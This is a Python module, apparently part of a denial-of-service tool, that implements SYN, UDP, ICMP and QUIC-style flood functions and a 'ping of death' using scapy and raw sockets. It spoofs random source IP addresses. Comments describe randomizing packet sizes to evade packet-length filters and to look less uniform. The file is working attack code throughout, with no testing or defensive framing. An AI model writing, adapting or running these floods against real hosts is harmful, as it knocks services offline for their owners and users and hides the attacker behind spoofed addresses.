import time
import socket
import random
from scapy.all import IP, TCP, UDP, ICMP, RandIP, RandShort, Raw, send, fragment
from src.utils.logging import add_system_log
from src.security import stop_event

def syn_flood(target_ip, target_port, duration, monitor=None, max_requests=0):
    """TCP SYN flood with IP spoofing"""
    end_time = time.time() + duration
    while time.time() < end_time:
        if stop_event.is_set(): break
        if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
            break
        try:
            ip = IP(src=RandIP(), dst=target_ip)
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
            raw = Raw(b"X" * 1024)
            send(ip / tcp / raw, loop=0, verbose=0)
            if monitor:
                monitor.update_stats(packets=1, bytes_sent=1024)
        except:
            if monitor:
                monitor.update_stats(failed=1)
            continue

def udp_flood(target_ip, target_port, duration, monitor=None, max_requests=0):
    """UDP flood with randomized payloads"""
    from src.security import increment_socket_counter, decrement_socket_counter
    end_time = time.time() + duration
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        increment_socket_counter()
        while time.time() < end_time:
            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                break
            # Randomize payload size to evade packet-length filters
            size = random.randint(512, 1490)
            payload = random._urandom(size)
            sock.sendto(payload, (target_ip, target_port))
            if monitor:
                monitor.update_stats(packets=1, bytes_sent=size)
    except:
        if monitor:
            monitor.update_stats(failed=1)
    finally:
        decrement_socket_counter()
        if sock:
            try: sock.close()
            except: pass

def icmp_flood(target_ip, duration, monitor=None):
    """ICMP (Ping) Flood - Randomized payload size"""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            size = random.randint(32, 1024)
            packet = IP(dst=target_ip)/ICMP()/Raw(load=random._urandom(size))
            send(packet, verbose=0)
            if monitor: monitor.update_stats(packets=1, bytes_sent=size)
        except:
            if monitor: monitor.update_stats(failed=1)

def ping_of_death(target_ip, duration, monitor=None):
    """Ping of Death - oversized fragmented ICMP packets"""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            # Vary the size to look less uniform
            size = random.randint(60000, 65500)
            packet = IP(dst=target_ip)/ICMP()/Raw(load="X"*size)
            frags = fragment(packet)
            for f in frags:
                send(f, verbose=0)
            if monitor: monitor.update_stats(packets=len(frags), bytes_sent=size)
        except:
            if monitor: monitor.update_stats(failed=1)

def quic_flood(target_ip, target_port, duration, monitor=None):
    """QUIC-like UDP Flood with dynamic payloads"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while time.time() < end_time:
            try:
                size = random.randint(1000, 1300)
                payload = random._urandom(size)
                sock.sendto(payload, (target_ip, target_port))
                if monitor: monitor.update_stats(packets=1, bytes_sent=size)
            except:
                if monitor: monitor.update_stats(failed=1)
    finally:
        try: sock.close()
        except: pass
